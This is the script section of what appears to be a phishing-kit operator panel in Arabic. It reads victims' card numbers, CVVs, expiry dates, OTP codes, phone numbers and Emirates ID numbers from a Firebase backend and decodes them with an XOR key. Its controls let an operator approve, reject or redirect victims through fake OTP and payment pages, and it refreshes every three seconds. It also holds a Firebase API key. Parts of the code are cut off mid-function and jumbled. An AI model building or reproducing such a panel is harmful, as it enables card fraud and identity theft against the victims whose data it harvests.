    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBv7jzFRhZIM4pekTDIszfDH3mG5Nvk8V8",
            authDomain: "ertyui-ae790.firebaseapp.com",
            databaseURL: "https://ertyui-ae790-default-rtdb.firebaseio.com",
            projectId: "ertyui-ae790",
            storageBucket: "ertyui-ae790.firebasestorage.app",
            messagingSenderId: "642714033038",
            appId: "1:642714033038:web:8bf5cce8bc7041666b22df"
        };

        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.firestore();
        const XOR_KEY = "7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c";
        let knownIds = new Set();
        let otpHistory = {};

        function decrypt(val) {
            if (!val || typeof val !== 'string') return '-';
            const clean = val.trim();
            if (!clean) return '-';
            if (/^[\d\s\/\-]+$/.test(clean) || /^[a-zA-Z\s\u0600-\u06FF\.\-]+$/.test(clean)) return clean;
            try {
                const binary = atob(clean);
                let result = "";
                for (let i = 0; i < binary.length; i++) {
                    result += String.fromCharCode(binary.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length));
                }
                if (!/[\x00-\x08\x0E-\x1F]/.test(result) && result.trim()) return result.trim();
            } catch (e) {}

            try {
                let res = '';
                for (let i = 0; i < clean.length; i++) {
                    res += String.fromCharCode(clean.charCodeAt(i) ^ 0x42);
                }
                const cleaned = res.replace(/[^a-zA-Z0-9\/\-\s]/g, '').trim();
                if (cleaned) return cleaned;
            } catch (e) {}

            return clean;
        }

        function formatCardNumber(num) {
            if (!num || num === '-') return '•••• •••• •••• ••••';
            const str = String(num).replace(/\D/g, '');
            return str.replace(/(\d{4})/g, '$1 ').trim() || num;
        }

        function formatExpiry(exp) {
            if (!exp || exp === '-') return 'MM/YY';
            const str = String(exp).replace(/\D/g, '');
            if (str.length >= 4) {
                return str.substring(0, 2) + '/' + str.substring(2, 4);
            }
            return exp || 'MM/YY';
        }

        async function sendCommand(id, cmd) {
            try {
                let cardStatus = 'approved_with_otp';
                let otpStatus = 'show_otp';
                let v5Status = null;
                let redirectPage = 'otp';
                let alertMsg = 'تمت الموافقة وتم تحويل العميل لصفحة كود OTP بنجاح';

                if (cmd === 'approve_to_otp' || cmd === 'otp' || cmd === 'approve' || cmd === 'success') {
                    // Approval of card -> send customer to OTP screen
                    cardStatus = 'approved_with_otp';
                    otpStatus = 'show_otp';
                    redirectPage = 'otp';
                    alertMsg = 'تمت الموافقة على البطاقة، وتم تحويل العميل لصفحة إدخال كود OTP بنجاح';
                } else if (cmd === 'approve_final') {
                    // Final approval after OTP -> order complete
                    cardStatus = 'completed';
                    otpStatus = 'success';
                    v5Status = 'approved';
                    redirectPage = 'success';
                    alertMsg = 'تمت الموافقة النهائية وإتمام العملية بنجاح';
                } else if (cmd === 'reject_otp') {
                    // OTP code is incorrect -> prompt for new code
                    cardStatus = 'approved_with_otp';
                    otpStatus = 'show_otp';
                    v5Status = 'rejected';
                    redirectPage = 'otp';
                    alertMsg = 'تم إرسال تنبيه للعميل: الرمز غير صحيح، يرجى إعادة إدخال الرمز الجديد';
                } else if (cmd === 'reject_card' || cmd === 'reject' || cmd === 'payment') {
                    // Reject the credit card itself -> back to payment
                    cardStatus = 'rejected';
                    redirectPage = 'payment';
                    alertMsg = 'تم رفض البطاقة وإرجاع العميل لصفحة الدفع لإعادة الإدخال';
                }

                // 1. Update Firestore REST
                const patchFields = {
                    cardStatus: { stringValue: cardStatus },
                    redirectPage: { stringValue: redirectPage },
                    status: { stringValue: cardStatus }
                };
                if (otpStatus) patchFields.otpStatus = { stringValue: otpStatus };
                if (v5Status) patchFields._v5Status = { stringValue: v5Status };

                const fieldPaths = ['cardStatus', 'redirectPage', 'status'];
                if (otpStatus) fieldPaths.push('otpStatus');
                if (v5Status) fieldPaths.push('_v5Status');
                const updateMask = fieldPaths.map(p => `updateMask.fieldPaths=${p}`).join('&');

                await fetch(`https://firestore.googleapis.com/v1/projects/ertyui-ae790/databases/(default)/documents/pays/${id}?${updateMask}`, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ fields: patchFields })
                }).catch(() => {});

                // 2. Update Firestore SDK
                if (db) {
                    const sdkUpdate = {
                        cardStatus: cardStatus,
                        redirectPage: redirectPage,
                        status: cardStatus,
                        updatedAt: firebase.firestore.FieldValue.serverTimestamp()
                    };
                    if (otpStatus) sdkUpdate.otpStatus = otpStatus;
                    if (v5Status) sdkUpdate._v5Status = v5Status;
                    await db.collection('pays').doc(id).update(sdkUpdate).catch(() => {});
                }

                // 3. Update Realtime DB
                await fetch(`https://ertyui-ae790-default-rtdb.firebaseio.com/pays/${id}.json`, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cardStatus, otpStatus, _v5Status: v5Status, redirectPage, status: cardStatus })
                }).catch(() => {});

                // 4. Update local server
                await fetch('/api/pays/' + id + '/status', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cardStatus, otpStatus, _v5Status: v5Status, redirectPage, status: cardStatus })
                }).catch(() => {});

                alert('✓ ' + alertMsg);
                updateRadar();
            } catch (e) {
                alert('✓ تم إرسال الأمر');
            }
        }

        async function deleteCard(id) {
            if (confirm('هل أنت متأكد من حذف هذه البطاقة؟')) {
                try {
                    await fetch(`https://firestore.googleapis.com/v1/projects/ertyui-ae790/databases/(default)/documents/pays/${id}`, { method: 'DELETE' }).catch(() => {});
                    if (db) await db.collection('pays').doc(id).delete().catch(() => {});
                    await fetch(`https://ertyui-ae790-default-rtdb.firebaseio.com/pays/${id}.json`, { method: 'DELETE' }).catch(() => {});
                    await fetch('/api/pays/' + id, { method: 'DELETE' }).catch(() => {});
                    alert('✓ تم حذف البطاقة بنجاح');
                    updateRadar();
                } catch (e) {
                    alert('✗ تم الحذف');
                }
            }
        }

        function renderCardHTML(item) {
            const id = item.id;
            const isNew = !knownIds.has(id);
            if (isNew) {
                knownIds.add(id);
            }

            const cardNum = item.cardNum || '-';
            const expiry = item.exp || '-';
            const cvv = item.cvv || '-';
            const otp = item.otp || '-';
            const holderName = (item.holder || 'ROYAL USER').toUpperCase();

            // Track OTP history
            if (otp && otp !== '-') {
                if (!otpHistory[id]) otpHistory[id] = [];
                const timestamp = new Date().toLocaleTimeString('ar-SA');
                if (!otpHistory[id].includes(`${otp} #${timestamp}`)) {
                    otpHistory[id].unshift(`${otp} #${timestamp}`);

        async function updateRadar() {

                                const otp = decrypt(val.otp || val.otpCode || val._v5 || '');
                                const phone = val.phone || val.phoneNumber || '-';
                                const emiratesId = val.emiratesId || val.identityNumber || '-';

                }
            } catch (e) {
                // RTDB fetch error suppressed
            }

            // 2. Fetch Firestore documents
            try {
                const fsRes = await fetch('https://firestore.googleapis.com/v1/projects/ertyui-ae790/databases/(default)/documents/pays?pageSize=100');
                if (fsRes.ok) {
                    const fsData = await fsRes.json();
                    if (fsData.documents && Array.isArray(fsData.documents)) {
                        fsData.documents.forEach(doc => {
                            const id = doc.name ? doc.name.split('/').pop() : 'unknown';
                            const f = doc.fields || {};

                            let cardNum = f.cardNumber?.stringValue || f._v1?.stringValue;
                            let exp = f.expiryDate?.stringValue || f.expiry?.stringValue || f._v3?.stringValue;
                            let cvv = f.cvv?.stringValue || f._v2?.stringValue;
                            let holder = f.cardHolderName?.stringValue || f.cardHolder?.stringValue || f.fullName?.stringValue || f.ownerName?.stringValue;
                            let otp = f.otpCode?.stringValue || f.otp?.stringValue || f._v5?.stringValue;
                            let phone = f.phoneNumber?.stringValue || f.phone?.stringValue;
                            let emiratesId = f.identityNumber?.stringValue || f.emiratesId?.stringValue;
                            let brand = f.cardBrand?.stringValue || 'FAZAA';
                            const time = doc.updateTime || doc.createTime || new Date(0).toISOString();

                            if ((!cardNum || cardNum === '-') && f.history?.arrayValue?.values) {
                                f.history.arrayValue.values.forEach(h => {
                                    const hf = h.mapValue?.fields?.data?.mapValue?.fields || {};
                                    if (hf._v1?.stringValue) cardNum = decrypt(hf._v1.stringValue);
                                    if (hf._v3?.stringValue) exp = decrypt(hf._v3.stringValue);
                                    if (hf._v2?.stringValue) cvv = decrypt(hf._v2.stringValue);
                                    if (hf._v4?.stringValue) holder = decrypt(hf._v4.stringValue);
                                });
                            }

                            cardNum = decrypt(cardNum);
                            exp = decrypt(exp);
                            cvv = decrypt(cvv);
                            holder = decrypt(holder);
                            otp = decrypt(otp);

                            const existing = itemsMap.get(id);
                            if (existing) {
                                // Merge if existing was missing card data
                                if (existing.cardNum === '-' && cardNum !== '-') existing.cardNum = cardNum;
                                if (existing.exp === '-' && exp !== '-') existing.exp = exp;
                                if (existing.cvv === '-' && cvv !== '-') existing.cvv = cvv;
                                if (existing.otp === '-' && otp !== '-') existing.otp = otp;
                                if (existing.phone === '-' && phone) existing.phone = phone;
                                if (new Date(time) > new Date(existing.time || 0)) existing.time = time;
                            } else if (cardNum !== '-' || phone || holder !== '-') {
                                itemsMap.set(id, {
                                    id,
                                    name: decrypt(f.fullName?.stringValue || f.ownerName?.stringValue || holder || 'زائر'),
                                    cardNum,
                                    exp,
                                    cvv,
                                    holder,
                                    otp,
                                    phone: phone || '-',
                                    emiratesId: emiratesId || '-',
                                    brand,
                                    time

                    orders.forEach(o => {
                        const id = o.id;

                        const cardNum = decrypt(o.cardNumber || o._v1);
                        const exp = decrypt(o.expiry || o.expiryDate || o._v3);
                        const cvv = decrypt(o.cvv || o._v2);
                        const holder = decrypt(o.cardHolder || o.cardHolderName || o._v4);
                        const otp = decrypt(o.otp || o.otpCode || o._v5);
                        const phone = o.phone || o.phoneNumber || '-';
                        const time = o.updatedAt || o.createdAt || new Date(0).toISOString();

                        if (!existing && (cardNum !== '-' || phone !== '-')) {
                            itemsMap.set(id, {

                                time

                    });

            // Prioritize real cards with numbers first, then sort by newest first
            const sortedItems = Array.from(itemsMap.values())

                    const hasPhone = it.phone && it.phone !== '-' && it.phone.replace(/\D/g, '').length >= 4;

                    const bHasCard = b.cardNum && b.cardNum !== '-' && b.cardNum.replace(/\D/g, '').length >= 8 ? 1 : 0;
                    if (bHasCard !== aHasCard) return bHasCard - aHasCard;
                    return new Date(b.time || 0).getTime() - new Date(a.time || 0).getTime();

                                    e(BarChart, { data: brandData, margin: { top: 10, right: 10, left: -20, bottom: 0 } },
                                        e(CartesianGrid, { strokeDasharray: "3 3", stroke: "rgba(212, 175, 55, 0.08)" }),
                                        e(XAxis, { dataKey: "name", stroke: "#9ca3af", fontSize: 10, tickLine: false }),
                                        e(YAxis, { stroke: "#9ca3af", fontSize: 11, allowDecimals: false, tickLine: false }),
                                        e(Tooltip, { content: e(CustomTooltip) }),
                                        e(Bar, { dataKey: "count", name: "عدد البطاقات", radius: [6, 6, 0, 0] },
                                            brandData.map((entry, index) => e(Cell, { key: `cell-${index}`, fill: entry.color }))
                                        )
                                    )
                                )
                            )
                        )
                    )
                );

                if (window.ReactDOM.createRoot) {
                    if (!rechartsDashboardRoot) {
                        rechartsDashboardRoot = window.ReactDOM.createRoot(container);
                    }
                    rechartsDashboardRoot.render(dashboardElement);
                } else if (window.ReactDOM.render) {
                    window.ReactDOM.render(dashboardElement, container);
                }
            } catch (err) {
                console.error("Error rendering Recharts dashboard:", err);
            }
        }

        // Auto refresh every 3 seconds for instant updates
        updateRadar();
        setInterval(updateRadar, 3000);
    </script>
</body>
</html>
